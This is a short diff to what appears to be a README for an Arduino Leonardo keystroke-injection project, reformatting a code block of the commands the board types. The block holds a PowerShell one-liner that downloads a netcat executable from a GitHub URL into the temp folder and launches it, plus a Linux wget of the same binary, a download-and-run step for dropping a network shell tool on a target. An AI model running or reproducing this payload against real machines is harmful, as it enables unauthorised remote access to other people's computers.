@@ -11,7 +11,9 @@ Because we need to access on keyboard so it depends on Arduino leonard. Also thi
 
 [NETCAT](https://github.com/s0l0n3t/netcat1221/raw/master/nc.exe)
 
-```c
-For windows powershell: (new-object System.Net.WebClient).DownloadFile('netcat github url','%TEMP%\nc1221.exe'); Start-Process "%TEMP%\nc1221.exe"
-linux: wget github.com/s0l0n3t/netcat1221/blob/master/nc.exe?raw=true
+```
+Windows Powershell:
+(new-object System.Net.WebClient).DownloadFile('netcat github url','%TEMP%\nc1221.exe'); Start-Process "%TEMP%\nc1221.exe"
+Linux:
+wget github.com/s0l0n3t/netcat1221/blob/master/nc.exe?raw=true
 ```
